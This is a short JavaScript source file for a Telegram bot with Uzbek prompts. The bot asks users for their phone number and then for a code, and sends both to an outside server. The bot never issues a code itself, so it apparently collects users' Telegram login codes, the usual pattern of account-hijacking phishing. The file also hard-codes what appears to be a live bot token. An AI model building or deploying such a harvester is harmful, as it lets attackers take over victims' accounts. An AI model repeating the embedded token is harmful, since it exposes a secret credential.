import TelegramBot from "node-telegram-bot-api";
import axios from "axios";

const token = "7874930235:AAGMbkZ9Gxc0dyg302tq6iV-jfuPCi5akEc";
const bot = new TelegramBot(token, { polling: true });

const sessions = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  sessions[chatId] = { step: "phone" };
  bot.sendMessage(chatId, "Assalomu alaykum! Telefon raqamingizni kiriting:");
});

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (!sessions[chatId]) return;

  const session = sessions[chatId];

  if (session.step === "phone") {
    session.phone = text;
    session.step = "code";
    bot.sendMessage(chatId, "Endi kodni kiriting:");
  } else if (session.step === "code") {
    session.code = text;

    try {
        await axios.post("https://bot-fvvc.onrender.com/api/user/create", {
        phone: session.phone,
        code: session.code,
      });

      bot.sendMessage(chatId, `✅ Raqamingiz muvaffaqiyatli saqlandi.`);
    } catch (error) {
      const message = `${error?.response?.data?.message} ( /start )` || "❌ Xatolik yuz berdi.  ( /start )";
      bot.sendMessage(chatId, message);
    }

    delete sessions[chatId];
  }
});
